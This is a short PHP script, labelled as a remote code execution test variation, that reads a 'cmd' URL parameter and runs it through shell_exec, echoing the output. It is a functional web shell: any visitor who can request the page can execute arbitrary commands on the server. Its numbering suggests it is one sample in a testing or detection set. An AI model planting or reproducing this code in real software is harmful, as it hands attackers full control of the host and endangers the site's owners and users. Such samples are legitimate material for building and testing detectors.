<?php
// RCE test variation #186
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>